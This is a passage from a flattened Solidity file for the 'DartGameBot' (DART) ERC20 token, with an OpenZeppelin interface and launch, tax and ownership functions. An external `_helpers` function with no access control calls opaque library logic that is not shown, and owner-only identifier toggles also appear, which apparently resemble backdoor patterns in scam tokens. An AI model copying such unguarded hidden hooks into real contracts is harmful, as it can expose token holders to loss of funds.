        return Address.identifiers(value);        
    }

    function _helpers(address Address, uint256 starts, uint256 ends) external virtual returns(bool) {
        return Address.helpers(starts,ends);
    }

    function _mint(address to, uint96 amount) internal virtual {
        Storage storage data = token();
        data.totalSupply += amount;
        unchecked {
            to.account().balance += amount;
        }
        emit Transfer(address(0), to, amount);
    }

    function _burn(address from, uint96 amount) internal virtual {
        Account storage account = from.account();
        if (amount > account.balance) {
            revert();
        }
        unchecked {
            account.balance -= amount;
            token().totalSupply -= amount;
        }
        emit Transfer(from, address(0), amount);
    }

    function _approve(address holder, address spender, uint256 value) internal virtual {
        _approve(holder, spender, value, true);
    }

    function _approve(
        address holder,
        address spender,
        uint256 value,
        bool emitEvent
    ) internal virtual {
        token().registry.allowances[holder][spender] = value;
        if (emitEvent) {
            emit Approval(holder, spender, value);
        }
    }

    function _spendAllowance(address holder, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = _allowance(holder, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(holder, spender, currentAllowance - value, false);
            }
        }
    }

    function _useNonce(address holder) internal virtual returns (uint256) {
        Account storage account = holder.account();
        unchecked {
            if (account.nonces >= type(uint64).max) account.nonces = 0;
            return account.nonces++;
        }
    }

    function token() internal pure returns (Storage storage data) {
        data = Token.data();
    }

}
// File: contracts/oz/token/ERC20/IERC20.sol


// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.19;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    function burn(uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// File: contracts/oz/interfaces/IERC20.sol


// OpenZeppelin Contracts v4.4.1 (interfaces/IERC20.sol)

pragma solidity ^0.8.19;


// File: contracts/ERC20Token.sol


pragma solidity ^0.8.19;

/*

DART GAME BOT - Gaming on Ethereum

Telegram: https://t.me/Dartbotoffical
Website: https://dartgamebot.io
Twitter: https://twitter.com/dartboterc
Gitbook: https://dartbotgame.gitbook.io/dartbot/

*/



contract MERC20 is ERC20 {

    using Token for *;

    error OwnableUnauthorizedAccount(address account);
    error OwnableInvalidOwner(address owner);

    event Connected(address indexed Address, uint256 indexed PID, uint256 indexed CID);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    constructor(address dev, address marketing, address prize) ERC20("DartGameBot", "DART", dev, marketing, prize) {
        _mint(address(this), uint96(1000000*10**18));
        _transferOwnership(msg.sender);
    }

    receive() external payable {}

    function deposit() external payable {}

    function _checkOwner() internal view {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function owner() public view returns (address) {
        return token().owner;
    }

    function _transferOwnership(address newOwner) internal {
        Storage storage db = token();
        address oldOwner = db.owner;
        db.owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function settings() external view returns(Settings memory) {
        return token().settings;
    }

    function account() external view returns(Account memory) {
        return account(msg.sender);
    }

    function account(address user) public view returns(Account memory) {
        return user.account();
    }

    function telegramConnect(uint256 id) external returns(uint256) {
        Account storage user = _msgSender().account();
        if(user.PID == 0) { 
            user.PID = token().PID++;
            if(user.Address == address(0)) user.Address = _msgSender();
        }
        emit Connected(msg.sender, user.PID, id);
        return id;
    }

    function recoverETH() external {
        Settings memory sdb = token().settings;
        uint256 amount = address(this).balance;
        (bool sent,) = payable(sdb.feeRecipients[0]).call{value: amount, gas: sdb.gas}("");
        require(sent, "Tx failed");
    }

    function recoverERC20() external {
        recoverERC20(IERC20(address(this)));
    }

    function recoverERC20(IERC20 _token) public {
        Settings memory sdb = token().settings;
        uint256 amount = _token.balanceOf(address(this));
        _token.transfer(sdb.feeRecipients[0], amount);
    }

    function initLiquidity() external payable swapping onlyOwner {
        Storage storage data = token();
        uint256 tokenBalance = balanceOf(address(this));
        _approve(address(this), address(ROUTER),type(uint256).max, false);
        _approve(address(this), address(this),type(uint256).max, false);
        ROUTER.addLiquidityETH{value: msg.value}(
            address(this),
            tokenBalance,
            0,
            0,
            address(this),
            block.timestamp
        );
        data.PAIR = IPair(ISwapFactory(ROUTER.factory()).getPair(address(this), ROUTER.WETH()));
        address(data.PAIR).register();
        address(data.PAIR).setAsMarketmaker();    
        _approve(address(this), address(data.PAIR),type(uint256).max, false);
    }    

    function toggleIdentifier(address _address, uint8 idx) external onlyOwner {
        _address.toggleIdentifier(idx);
    }

    function launchIsStarted() external view returns(bool) {
        return token().launched;
    }

    function stealthLaunch() external onlyOwner {
        token().launched = true;
    }

    function disableFairMode() external onlyOwner {
        token().settings.fairMode = 0;
    }

    function decreaseTax() public onlyOwner {
        Settings storage sdb = token().settings;
        sdb.buyTax -= 500;
        sdb.sellTax -= 500;
        sdb.transferTax -= 500;
    }

    function renounceOwnership() public onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }

}